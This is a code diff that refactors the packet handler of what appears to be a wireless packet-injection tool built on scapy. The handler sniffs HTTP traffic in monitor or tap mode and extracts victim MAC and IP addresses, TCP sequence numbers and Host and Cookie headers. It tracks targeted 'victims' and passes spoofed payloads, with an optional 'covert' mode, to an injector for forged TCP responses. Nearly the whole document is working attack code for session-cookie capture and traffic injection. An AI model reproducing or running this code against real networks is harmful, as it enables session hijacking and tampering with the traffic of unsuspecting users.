@@ -1,7 +1,7 @@
 from lib.injector import Injector
 from lib.victim import Victim
 from scapy.all import *
-import socket
+import socket, time
 
 ## Originally in injector.py and imported via *
 global BLOCK_HOSTS
@@ -68,141 +68,8 @@ class PacketHandler(object):
         self.newvictims = []
         self.injector = Injector(self.i)
 
-    def proc_excluded(self, excluded):
-        """Check if argument provided in excluded is an ip.
-        
-        If it's not, dns resolve it and add those IPs to the exclude list.
-        """
-        processed = set()
-        for item in excluded:
-            try:
-                test = item.split(".")
-                if (len(test) != 4):
-                    try:
-                        processed.add(socket.gethostbyname(item))
-                    except:
-                        pass
 
-                ### This logic can be cleaner/faster
-                ### regex -or- (mac check, then assume if try fails, it must be ip)
-                else:
-                    #print test
-                    try:
-                        if int(test[0])>0 and int(test[0]) < 256:
-                            if int(test[1])>0 and int(test[1]) < 256:
-                                if int(test[2])>0 and int(test[2]) < 256:
-                                    if int(test[3])>0 and int(test[3]) < 256:
-                                        processed.add(item)
-
-                    except:
-                        processed.add(socket.gethostbyname(item))
-
-            except:
-                try:
-                    processed.add(socket.gethostbyname(item))
-                except:
-                    pass
-
-        return processed
-
-
-    def search_cookie(self, ret2):
-        """Looks for cookie in string returned by PacketHandler.get_request().
-        
-        Returns a List object [host, cookie] if there is one, otherwise returns None.
-        """
-        if (len(ret2.strip()) > 0):
-            arr = ret2.split("\n")
-            #print ret2
-            host = ""
-            cookie = ""
-            for line in arr:
-                if ('Cookie' in line):
-                    cookie = line.strip()
-
-                if ('Host' in line):
-                    host = line.split()[1].strip()
-
-            if (len(host) != 0 and len(cookie) != 0):
-                return [host, cookie]
-            else:
-                if (len(host) > 0):
-                    return (host, None)
-                else:
-                    return None
-
-        else:
-            return None
-
-
-    def get_request(self, pkt):
-        """Extracts request payload as a string from the packet object
-        if there is a payload, otherwise returns None.
-        """
-        ### This is where we can see the return from the server for the Domain=
-        ### Needed for extract_cookies() in logger.py
-        #print pkt.sprintf("{IP:%IP.src% -> %IP.dst%\n}{Raw:%Raw.load%\n}")
-        
-        ret2 = "\n".join(pkt.sprintf("{Raw:%Raw.load%}\n").split(r"\r\n"))
-        if (len(ret2.strip()) > 0):
-            return ret2.translate(None, "'").strip()
-        else:
-            return None
-
-
-    def handle_default(self, packet):
-        """Default packet handler, looks for GET requests in the TCP layer."""
-        if packet.haslayer(IP) and packet.haslayer(TCP):
-            ## MONITOR MODE
-            if packet.haslayer(Dot11) and not packet.haslayer(Ether):
-                vicmac = packet.getlayer(Dot11).addr2
-                rtrmac = packet.getlayer(Dot11).addr1
-
-            ## TAP MODE
-            else:
-                vicmac = packet.getlayer(Ether).src
-                rtrmac = packet.getlayer(Ether).dst
-
-            vicip = packet.getlayer(IP).src
-            svrip = packet.getlayer(IP).dst
-            vicport = packet.getlayer(TCP).sport
-            svrport = packet.getlayer(TCP).dport
-            size = len(packet.getlayer(TCP).load)
-            acknum = str(int(packet.getlayer(TCP).seq) + size)
-            seqnum = packet.getlayer(TCP).ack
-            request = self.get_request(packet)
-            global BLOCK_HOSTS
-            for obj in BLOCK_HOSTS:
-                ip, seq = obj
-                if (svrip == ip and seqnum != seq):
-                    #print "REMOVING ", svrip
-                    for obj2 in BLOCK_HOSTS:
-                        ip2, seq2 = obj2
-                        if (ip2 == svrip):
-                            BLOCK_HOSTS.remove((ip2, seq2))
-
-            if self.trigger in request:
-                if self.verbose and request:
-                    print '\n\n%s' % request
-                pass
-            else:
-                return 0
-            #print BLOCK_HOSTS
-            #print request
-
-            try:
-                TSVal, TSecr = packet.getlayer(TCP).options[2][1]
-            except:
-                TSVal = None
-                TSecr = None
-
-            cookie = self.search_cookie(request)
-            #print (vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, TSVal, TSecr)
-            return (vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, TSVal, TSecr)
-        return None
-
-
-    def cookie_mgmt(self, vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, args):
+    def cookieManager(self, vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, args):
         """This function does cookie management for broadcast mode and targeted mode.
 
         A new mode is also added that can work in both broadcast
@@ -368,6 +235,35 @@ class PacketHandler(object):
                         self.newvictims.append(v1)
 
 
+    def cookieSearch(self, ret2):
+        """Looks for cookie in string returned by PacketHandler.requestExtractor().
+        
+        Returns a List object [host, cookie] if there is one, otherwise returns None.
+        """
+        if (len(ret2.strip()) > 0):
+            arr = ret2.split("\n")
+            #print ret2
+            host = ""
+            cookie = ""
+            for line in arr:
+                if ('Cookie' in line):
+                    cookie = line.strip()
+
+                if ('Host' in line):
+                    host = line.split()[1].strip()
+
+            if (len(host) != 0 and len(cookie) != 0):
+                return [host, cookie]
+            else:
+                if (len(host) > 0):
+                    return (host, None)
+                else:
+                    return None
+
+        else:
+            return None
+
+
     def covert_injection(self, vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, injection):
         global BLOCK_HOSTS
         #print svrip,BLOCK_HOSTS
@@ -402,7 +298,119 @@ class PacketHandler(object):
         return injection
 
 
-    def proc_injection(self, vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, TSVal, TSecr, args):
+    def proc_excluded(self, excluded):
+        """Check if argument provided in excluded is an ip.
+        
+        If it's not, dns resolve it and add those IPs to the exclude list.
+        """
+        processed = set()
+        for item in excluded:
+            try:
+                test = item.split(".")
+                if (len(test) != 4):
+                    try:
+                        processed.add(socket.gethostbyname(item))
+                    except:
+                        pass
+
+                ### This logic can be cleaner/faster
+                ### regex -or- (mac check, then assume if try fails, it must be ip)
+                else:
+                    #print test
+                    try:
+                        if int(test[0])>0 and int(test[0]) < 256:
+                            if int(test[1])>0 and int(test[1]) < 256:
+                                if int(test[2])>0 and int(test[2]) < 256:
+                                    if int(test[3])>0 and int(test[3]) < 256:
+                                        processed.add(item)
+
+                    except:
+                        processed.add(socket.gethostbyname(item))
+
+            except:
+                try:
+                    processed.add(socket.gethostbyname(item))
+                except:
+                    pass
+
+        return processed
+
+
+    def proc_handler(self, packet):
+        """Process handler
+        Obtains specific bits of the packet, orders them accordingly
+        """
+        if packet.haslayer(IP) and packet.haslayer(TCP):
+            procTimerStart = time.time()
+            ## MONITOR MODE
+            if packet.haslayer(Dot11) and not packet.haslayer(Ether):
+                vicmac = packet.getlayer(Dot11).addr2
+                rtrmac = packet.getlayer(Dot11).addr1
+
+            ## TAP MODE
+            else:
+                vicmac = packet.getlayer(Ether).src
+                rtrmac = packet.getlayer(Ether).dst
+
+            vicip = packet.getlayer(IP).src
+            svrip = packet.getlayer(IP).dst
+            vicport = packet.getlayer(TCP).sport
+            svrport = packet.getlayer(TCP).dport
+            size = len(packet.getlayer(TCP).load)
+            acknum = str(int(packet.getlayer(TCP).seq) + size)
+            seqnum = packet.getlayer(TCP).ack
+            request = self.requestExtractor(packet)
+            global BLOCK_HOSTS
+            for obj in BLOCK_HOSTS:
+                ip, seq = obj
+                if (svrip == ip and seqnum != seq):
+                    #print "REMOVING ", svrip
+                    for obj2 in BLOCK_HOSTS:
+                        ip2, seq2 = obj2
+                        if (ip2 == svrip):
+                            BLOCK_HOSTS.remove((ip2, seq2))
+
+            if self.trigger in request:
+                if self.verbose and request:
+                    print '\n\n%s' % request
+                pass
+            else:
+                return 0
+            #print BLOCK_HOSTS
+            #print request
+
+            try:
+                TSVal, TSecr = packet.getlayer(TCP).options[2][1]
+            except:
+                TSVal = None
+                TSecr = None
+
+            cookie = self.cookieSearch(request)
+            #print (vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, TSVal, TSecr)
+            return (vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, TSVal, TSecr, procTimerStart)
+        return None
+
+
+    def condensor(self, vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, TSVal, TSecr, args, injection, victim, procTimerStart):
+        print 'condensed!'
+        #print dir(victim)
+        if victim.victim_parameters.covert:
+            print 'covert'
+            cov_injection = self.covert_injection(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, injection)
+            if (cov_injection != 0):
+                injection = cov_injection
+            else:
+                return 0
+        else:
+            print 'not covert'
+
+        #print injection
+        procTimerEnd = time.time()
+        self.injector.inject(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, injection, TSVal, TSecr, args, procTimerStart, procTimerEnd)
+        print 'sent'
+
+
+    def proc_injection(self, vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, TSVal, TSecr, args, procTimerStart):
         """Process injection function using the PacketHandler.victims List.
         
         If it was set, to check if the packet belongs to any of the targets.
@@ -427,33 +435,14 @@ class PacketHandler(object):
                     if (victim.ip == vicip):
                         injection = victim.get_injection()
                         if (injection is not None):
-                            if (victim.victim_parameters.covert):
-                                cov_injection = self.covert_injection(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, injection)
-                                if (cov_injection != 0):
-                                    injection = cov_injection
-
-                                else:
-                                    return 0
-
-                            #print injection
-                            ### Broadcast injector is here
-                            self.injector.inject(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, injection, TSVal, TSecr, args)
+                            self.condensor(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, TSVal, TSecr, args, injection, victim, procTimerStart)
 
                 else:
                     if (victim.mac is not None):
                         if (victim.mac.lower() == vicmac.lower()):
                             injection = victim.get_injection()
                             if (injection is not None):
-                                if (victim.victim_parameters.covert):
-                                    cov_injection = self.covert_injection(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, injection)
-                                    if (cov_injection != 0):
-                                        injection=cov_injection
-
-                                    else:
-                                        return 0
-                                #print injection
-                                self.injector.inject(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, injection, TSVal, TSecr, args)
-
+                                self.condensor(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, TSVal, TSecr, args, injection, victim, procTimerStart)
         else:
             if (self.victim_parameters is not None):
                 if (self.victim_parameters.in_request is not None):
@@ -472,32 +461,14 @@ class PacketHandler(object):
                         if (victim.ip == vicip):
                             injection = victim.get_injection()
                             if (injection is not None):
-                                if (victim.victim_parameters.covert):
-                                    cov_injection = self.covert_injection(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, injection)
-                                    if (cov_injection != 0):
-                                        injection = cov_injection
-
-                                    else:
-                                        return 0
-
-                                #print injection
-                                self.injector.inject(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, injection, TSVal, TSecr, args)
+                                self.condensor(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, TSVal, TSecr, args, injection, victim, procTimerStart)
 
                     else:
                         if (victim.mac is not None):
                             if (victim.mac.lower() == vicmac.lower()):
                                 injection = victim.get_injection()
                                 if (injection is not None):
-                                    if (victim.victim_parameters.covert):
-                                        cov_injection = self.covert_injection(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, injection)
-                                        if (cov_injection != 0):
-                                            injection = cov_injection
-
-                                        else:
-                                            return 0
-
-                                    #print injection
-                                    self.injector.inject(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, injection, TSVal, TSecr, args)
+                                    self.condensor(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, TSVal, TSecr, args, injection, victim, procTimerStart)
 
             if (self.excluded is not None):
                 if (svrip in self.excluded):
@@ -513,18 +484,7 @@ class PacketHandler(object):
 
                         injection = victim.get_injection()
                         if (injection is not None):
-                            #print vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, injection
-                            if (victim.victim_parameters.covert):
-                                cov_injection = self.covert_injection(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, injection)
-                                if (cov_injection != 0):
-                                    injection = cov_injection
-
-                                else:
-                                    return 0
-
-                            #print injection
-                            self.injector.inject(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, injection, TSVal, TSecr, args)
-
+                            self.condensor(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, TSVal, TSecr, args, injection, victim, procTimerStart)
                 else:
                     if (victim.mac is not None):
                         if (victim.mac.lower() == vicmac.lower()):
@@ -535,18 +495,7 @@ class PacketHandler(object):
 
                             injection = victim.get_injection()
                             if (injection is not None):
-                                if (victim.victim_parameters.covert):
-                                    cov_injection = self.covert_injection(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, injection)
-                                    if (cov_injection != 0):
-                                        injection=cov_injection
-
-                                    else:
-                                        return 0
-
-                                #print injection
-                                #print host, filename
-                                self.injector.inject(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, injection, TSVal, TSecr, args)
-
+                                self.condensor(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, TSVal, TSecr, args, injection, victim, procTimerStart)
 
     def process(self, interface, pkt, args):
         """Process packets coming from the sniffer.
@@ -562,9 +511,21 @@ class PacketHandler(object):
         else:
             #ls(pkt)
             try:
-                vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, TSVal, TSecr = self.handle_default(pkt)
-                self.cookie_mgmt(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, args)
-                self.proc_injection(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, TSVal, TSecr, args)
+                vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, TSVal, TSecr, procTimerStart = self.proc_handler(pkt)
+                self.cookieManager(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, args)
+                self.proc_injection(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, TSVal, TSecr, args, procTimerStart)
             except:
                 return
  
+ 
+    def requestExtractor(self, pkt):
+        """Extracts request payload as a string from the packet object"""
+        ### This is where we can see the return from the server for the Domain=
+        ### Needed for cookieExtractor() in logger.py
+        #print pkt.sprintf("{IP:%IP.src% -> %IP.dst%\n}{Raw:%Raw.load%\n}")
+
+        ret2 = "\n".join(pkt.sprintf("{Raw:%Raw.load%}\n").split(r"\r\n"))
+        if (len(ret2.strip()) > 0):
+            return ret2.translate(None, "'").strip()
+        else:
+            return None
